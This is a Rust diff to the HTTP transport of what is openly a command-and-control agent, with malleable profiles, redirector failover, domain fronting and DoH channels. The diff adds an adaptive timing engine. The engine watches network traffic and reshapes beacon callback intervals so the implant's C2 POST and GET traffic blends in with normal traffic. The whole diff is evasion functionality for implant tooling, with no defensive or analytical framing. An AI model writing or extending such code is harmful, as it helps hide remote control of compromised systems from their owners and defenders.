@@ -633,6 +633,12 @@ pub struct HttpTransport {
     per_redirector_clients: std::collections::HashMap<String, reqwest::Client>,
     /// Redirector chain failover state.
     failover: std::sync::Mutex<FailoverState>,
+    /// Optional adaptive timing engine.  When `adaptive_timing_enabled`
+    /// is `true` in the malleable profile, this timer learns network
+    /// traffic patterns and adjusts callback timing to blend in.
+    /// Shared across all C2 channels (HTTP, DoH) via `Arc`.
+    #[cfg(feature = "adaptive-timing")]
+    adaptive_timer: Option<Arc<crate::adaptive_timing::AdaptiveTimer>>,
 }
 
 impl HttpTransport {
@@ -775,7 +781,19 @@ impl HttpTransport {
             front_domain,
             per_redirector_clients,
             failover: std::sync::Mutex::new(failover),
+            #[cfg(feature = "adaptive-timing")]
+            adaptive_timer: None,
         })
+    }
+
+    /// Attach a shared adaptive timer to this transport.
+    ///
+    /// Call this after construction if `adaptive_timing_enabled` is `true`
+    /// in the malleable profile.  The same `Arc<AdaptiveTimer>` should be
+    /// shared across all C2 channels (HTTP, DoH).
+    #[cfg(feature = "adaptive-timing")]
+    pub fn set_adaptive_timer(&mut self, timer: Arc<crate::adaptive_timing::AdaptiveTimer>) {
+        self.adaptive_timer = Some(timer);
     }
 
     /// Resolve the base endpoint URL with redirector chain awareness.
@@ -1145,9 +1163,55 @@ impl HttpTransport {
         req
     }
 
-    /// Calculate jittered sleep duration from the profile.
+    /// Calculate jittered sleep duration.
+    ///
+    /// When an adaptive timer is attached and has completed its learning
+    /// phase, uses the timer's learned profile to produce realistic timing.
+    /// Otherwise falls back to the malleable profile's `jittered_sleep()`.
     fn jittered_sleep(&self) -> Duration {
+        #[cfg(feature = "adaptive-timing")]
+        if let Some(ref timer) = self.adaptive_timer {
+            if timer.state() != crate::adaptive_timing::TimerState::Learning {
+                return timer.next_callback_time();
+            }
+        }
         self.profile.jittered_sleep()
+    }
+
+    /// Record a traffic observation with the adaptive timer (if present).
+    ///
+    /// This is a no-op when the `adaptive-timing` feature is disabled or
+    /// when no timer has been attached.  The timer passively learns from
+    /// all observed network traffic to build a realistic timing profile.
+    #[cfg(feature = "adaptive-timing")]
+    fn observe_traffic(
+        &self,
+        bytes_sent: usize,
+        bytes_received: usize,
+        direction: crate::adaptive_timing::Direction,
+        protocol: crate::adaptive_timing::Protocol,
+    ) {
+        if let Some(ref timer) = self.adaptive_timer {
+            timer.observe(crate::adaptive_timing::TrafficObservation {
+                timestamp: std::time::Instant::now(),
+                bytes_sent,
+                bytes_received,
+                direction,
+                protocol,
+                source: crate::adaptive_timing::TrafficSource::Agent,
+            });
+        }
+    }
+
+    /// No-op when adaptive timing is disabled.
+    #[cfg(not(feature = "adaptive-timing"))]
+    fn observe_traffic(
+        &self,
+        _bytes_sent: usize,
+        _bytes_received: usize,
+        _direction: (),
+        _protocol: (),
+    ) {
     }
 
     /// Rotate the URI index for the given transaction type after failures.
@@ -1266,7 +1330,7 @@ impl Transport for HttpTransport {
             req
         };
 
-        let req = req.body(body);
+        let req = req.body(body.clone());
 
         let result = self.connect_with_retry(req, "http_post").await;
         match result {
@@ -1276,6 +1340,16 @@ impl Transport for HttpTransport {
                 if !resp.status().is_success() {
                     anyhow::bail!("C2 POST returned HTTP {}", resp.status());
                 }
+                // Observe the outbound traffic for adaptive timing.
+                #[cfg(feature = "adaptive-timing")]
+                self.observe_traffic(
+                    body.len(),
+                    0,
+                    crate::adaptive_timing::Direction::Outbound,
+                    crate::adaptive_timing::Protocol::HTTP,
+                );
+                #[cfg(not(feature = "adaptive-timing"))]
+                let _ = &body;
                 Ok(())
             }
             Err(e) => {
@@ -1389,6 +1463,15 @@ impl Transport for HttpTransport {
 
         let resp_headers = resp.headers().clone();
         let bytes = resp.bytes().await?;
+
+        // Observe the inbound traffic for adaptive timing.
+        #[cfg(feature = "adaptive-timing")]
+        self.observe_traffic(
+            0,
+            bytes.len(),
+            crate::adaptive_timing::Direction::Inbound,
+            crate::adaptive_timing::Protocol::HTTP,
+        );
 
         if bytes.is_empty() {
             // No tasking: sleep with profile jitter, then signal the caller
